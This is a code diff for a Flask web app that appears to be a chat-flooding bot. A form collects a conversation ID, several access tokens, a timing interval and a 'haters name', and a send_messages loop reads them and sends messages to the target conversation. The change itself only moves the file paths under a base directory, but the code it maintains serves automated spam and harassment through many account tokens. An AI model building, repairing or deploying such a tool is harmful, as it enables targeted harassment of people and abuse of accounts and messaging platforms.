@@ -8,6 +8,9 @@ from flask import Flask, request, render_template, redirect, url_for
 
 app = Flask(__name__)
 
+# Set the base directory
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -20,16 +23,16 @@ def add_data():
         time_interval = request.form['time']
         haters_name = request.form['hatersname']
 
-        with open('convo.txt', 'w') as file:
+        with open(os.path.join(BASE_DIR, 'convo.txt'), 'w') as file:
             file.write(uid)
         
-        with open('tokennum.txt', 'a') as file:
+        with open(os.path.join(BASE_DIR, 'tokennum.txt'), 'a') as file:
             file.write(token + '\n')
         
-        with open('time.txt', 'w') as file:
+        with open(os.path.join(BASE_DIR, 'time.txt'), 'w') as file:
             file.write(time_interval)
         
-        with open('hatersname.txt', 'w') as file:
+        with open(os.path.join(BASE_DIR, 'hatersname.txt'), 'w') as file:
             file.write(haters_name)
         
         return redirect(url_for('index'))
@@ -37,7 +40,7 @@ def add_data():
 def send_messages():
     while True:
         try:
-            with open('tokennum.txt', 'r') as file:
+            with open(os.path.join(BASE_DIR, 'tokennum.txt'), 'r') as file:
                 tokens = file.readlines()
             num_tokens = len(tokens)
 
@@ -57,22 +60,22 @@ def send_messages():
 
             access_tokens = [token.strip() for token in tokens]
 
-            with open('convo.txt', 'r') as file:
+            with open(os.path.join(BASE_DIR, 'convo.txt'), 'r') as file:
                 convo_id = file.read().strip()
 
-            with open('file.txt', 'r') as file:
+            with open(os.path.join(BASE_DIR, 'file.txt'), 'r') as file:
                 text_file_path = file.read().strip()
 
-            with open(text_file_path, 'r') as file:
+            with open(os.path.join(BASE_DIR, text_file_path), 'r') as file:
                 messages = file.readlines()
 
             num_messages = len(messages)
             max_tokens = min(num_tokens, num_messages)
 
-            with open('hatersname.txt', 'r') as file:
+            with open(os.path.join(BASE_DIR, 'hatersname.txt'), 'r') as file:
                 haters_name = file.read().strip()
 
-            with open('time.txt', 'r') as file:
+            with open(os.path.join(BASE_DIR, 'time.txt'), 'r') as file:
                 speed = int(file.read().strip())
 
             liness()
